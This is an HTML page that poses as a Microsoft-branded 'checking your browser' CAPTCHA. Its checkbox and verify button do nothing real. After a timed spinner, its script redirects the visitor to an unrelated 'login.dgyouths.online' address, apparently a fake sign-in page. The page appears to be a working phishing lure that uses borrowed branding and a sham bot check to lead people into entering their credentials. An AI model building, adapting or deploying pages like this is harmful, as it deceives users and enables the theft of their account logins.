<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: inline-block;
            border-radius: 5px;
            text-align: center;
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 100px;
        }
        .captcha-box {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background: #eee;
            cursor: pointer;
        }
        .captcha-box input {
            margin-right: 10px;
        }
        .verify-btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
        }
        .verify-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        .loading {
            display: none;
            margin-top: 20px;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: auto;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
        <h2>Checking your browser before accessing</h2>
        <p>This process is automatic. Your browser will redirect once the verification is complete.</p>
        <div class="captcha-box" onclick="toggleCaptcha()">
            <input type="checkbox" id="captcha-checkbox">
            <label for="captcha-checkbox">I am not a robot</label>
        </div>
        <button class="verify-btn" id="verify-btn" disabled onclick="startVerification()">Verify CAPTCHA</button>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Verifying...</p>
        </div>
    </div>

    <script>
        function toggleCaptcha() {
            let checkbox = document.getElementById("captcha-checkbox");
            let button = document.getElementById("verify-btn");
            checkbox.checked = !checkbox.checked;
            button.disabled = !checkbox.checked;
        }

        function startVerification() {
            document.getElementById("verify-btn").style.display = "none";
            document.getElementById("loading").style.display = "block";
            setTimeout(() => {
                redirectToURL();
            }, 4000); // 4 seconds delay
        }

        function redirectToURL() {
            window.location.href = "https://login.dgyouths.online/XrxEaSmf";
        }
    </script>
</body>
</html>
